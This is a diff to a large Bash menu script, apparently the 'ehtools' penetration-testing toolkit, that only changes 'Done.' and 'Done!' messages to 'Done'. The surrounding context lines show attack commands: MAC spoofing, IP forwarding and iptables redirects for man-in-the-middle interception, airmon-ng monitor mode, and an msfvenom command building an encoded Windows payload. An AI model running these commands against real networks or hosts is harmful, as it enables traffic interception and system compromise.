@@ -510,7 +510,7 @@ function change_mac
 			ifconfig $MYINT down
 			macchanger -r $MYINT
 			ifconfig $MYINT up
-			echo -e "Done."
+			echo -e "Done"
 		else
 			echo -e "Enter the MAC you want:"
 			read -p $'(\e[4;93m(new)mac\e[0m\en)> ' SMAC
@@ -518,7 +518,7 @@ function change_mac
 			ifconfig $MYINT down
 			macchanger -m $SMAC $MYINT
 			ifconfig $MYINT up
-			echo -e "Done."
+			echo -e "Done"
 		fi
 	fi
 }
@@ -653,7 +653,7 @@ else
 			echo "$CHECKKS" > "$KSPATH"/"$TITLE"/"$TITLE"ks.txt
 			echo "$NAMECD" > "$KSPATH"/"$TITLE"/"$TITLE".txt
 			echo "$KSSET" > "$KSPATH"/"$TITLE"/"$TITLE"2.txt
-			echo -e "Done!"
+			echo -e "Done"
 			echo -e "$PAKTGB"
 			$READAK
 			clear
@@ -663,7 +663,7 @@ else
 			echo -e "Removing shortcut for "$TITLE"..."
 			rm -r "$KSPATH"/"$TITLE"
 			sleep 1
-			echo -e "Done!"
+			echo -e "Done"
 			echo -e "$PAKTGB"
 			$READAK
 			clear
@@ -1422,7 +1422,7 @@ then
 	sleep 1
 	systemctl --user enable pulseaudio && systemctl --user start pulseaudio
 	clear
-	echo -e "Done!"
+	echo -e "Done"
 	sleep 1
 	clear
 	echo -e "I mean...Try to see if you have audio."
@@ -1664,12 +1664,12 @@ then
 	if [[ "$MITMCH" = "1" ]]
 	then
 		echo "1" > /proc/sys/net/ipv4/ip_forward
-		echo -e "Done."
+		echo -e "Done"
 		sleep 1
 	elif [[ "$MITMCH" = "d1" ]]
 	then
 		echo "0" > /proc/sys/net/ipv4/ip_forward
-		echo -e "Done."
+		echo -e "Done"
 		sleep 1
 	elif [[ "$MITMCH" = "2" ]]
 	then
@@ -1691,7 +1691,7 @@ then
 		iptables --flush -t nat
 		iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $PORTTCP
 		iptables -t nat -A PREROUTING -p udp --destination-port 40 -j REDIRECT --to-port $PORTUDP
-		echo -e "Done."
+		echo -e "Done"
 		sleep 1
 	elif [[ "$MITMCH" = "3" ]]
 	then
@@ -1815,12 +1815,12 @@ then
 	if [[ "$MITMSET" = "1" ]]
 	then
 		echo "1" > /proc/sys/net/ipv4/ip_forward
-		echo -e "Done."
+		echo -e "Done"
 		sleep 1
 	elif [[ "$MITMSET" = "d1" ]]
 	then
 		echo "0" > /proc/sys/net/ipv4/ip_forward
-		echo -e "Done."
+		echo -e "Done"
 		sleep 1
 	elif [[ "$MITMSET" = "2" ]]
 	then
@@ -6297,7 +6297,7 @@ function metasploit_menu
 		else
 			msfvenom -p $PAYLOADL --platform windows -a x86 -f exe -e x86/shikata_ga_nai EHOST="$ATIP" EPORT="$ATPORT" -o "$ATEXEPATH"
 		fi
-		echo -e "Done."
+		echo -e "Done"
 		echo -e ""
 		echo -e "$PAKTC"
 		$READAK
@@ -6510,28 +6510,28 @@ function update_ehtools
 				then
 					echo -e "Copying your shortcuts"
 					cp -r /root/ehtold/ehtools/ks "$EPATH"
-					echo -e "Done."
+					echo -e "Done"
 					sleep 0.2
 				fi
 				if [[ -d /root/ehtold/ehtools/settings ]]
 				then
 					echo -e "Copying your settings"
 					cp -r /root/ehtold/ehtools/settings "$EPATH"
-					echo -e "Done."
+					echo -e "Done"
 					sleep 0.2
 				fi
 				if [[ -f /root/ehtold/ehtools/wlanmon.txt ]]
 				then
 					echo -e "Copying your interfaces"
 					cp /root/ehtold/ehtools/wlanmon.txt "$EPATH"
-					echo -e "Done."
+					echo -e "Done"
 					sleep 0.2
 				fi
 				echo -e ""
 				if [[ -f /root/ehtold/ehtools/wlan.txt ]]
 				then
 					cp /root/ehtold/ehtools/wlan.txt "$EPATH"
-					echo -e "Done."
+					echo -e "Done"
 					sleep 0.2
 					clear
 				fi
@@ -9763,7 +9763,7 @@ function main_options
 		else
 			echo -e "Enabling $WLANNM..."
 			echo -e "Killing services..."
-			(airmon-ng check kill &> /dev/null && echo -e "Done." ) || echo -e ""$RS"Error killing services"$YS""
+			(airmon-ng check kill &> /dev/null && echo -e "Done" ) || echo -e ""$RS"Error killing services"$YS""
 			echo -e "Starting monitor mode..."
 			(airmon-ng start $WLANN &>/dev/null && echo -e "Done" ) || echo -e "Error starting monitor mode."
 		fi
@@ -9787,7 +9787,7 @@ function main_options
 		ifconfig $MYINT down
 		macchanger -p $MYINT
 		ifconfig $MYINT up
-		echo -e "Done."
+		echo -e "Done"
 	elif [[ "$YORNAA" = "4" ]]
 	then
 		if [[ ! -f "/etc/init.d/anonym8.sh" ]]
@@ -9801,7 +9801,7 @@ function main_options
 		else
 			echo -e "Enabling anonym8..."
 			anonym8 start
-			echo -e "Done."
+			echo -e "Done"
 		fi
 	elif [[ "$YORNAA" = "d4" ]]
 	then
@@ -9816,7 +9816,7 @@ function main_options
 		else
 			echo -e "Disabling anonym8..."
 			anonym8 stop
-			echo -e "Done."
+			echo -e "Done"
 		fi
 	elif [[ "$YORNAA" = "5" ]]
 	then
@@ -9831,7 +9831,7 @@ function main_options
 		else
 			echo -e "Enabling anonsurf..."
 			anonsurf start
-			echo -e "Done."
+			echo -e "Done"
 		fi
 	elif [[ "$YORNAA" = "d5" ]]
 	then
@@ -9846,7 +9846,7 @@ function main_options
 		else
 			echo -e "Disabling anonsurf..."
 			anonsurf stop
-			echo -e "Done."
+			echo -e "Done"
 		fi
 	elif [[ "$YORNAA" = "6" ]]
 	then
@@ -9861,7 +9861,7 @@ function main_options
 		else
 			echo -e "Status of anonsurf..."
 			anonsurf status
-			echo -e "Done."
+			echo -e "Done"
 		fi
 	elif [[ "$YORNAA" = "d6" ]]
 	then
@@ -9876,7 +9876,7 @@ function main_options
 		else
 			echo -e "Restarting anonsurf..."
 			anonsurf change
-			echo -e "Done."
+			echo -e "Done"
 		fi
 	elif [[ "$YORNAA" = "r6" ]]
 	then
@@ -9891,7 +9891,7 @@ function main_options
 		else
 			echo -e "Restarting anonsurf..."
 			anonym8 change
-			echo -e "Done."
+			echo -e "Done"
 		fi
 	elif [[ "$YORNAA" = "7" ]]
 	then
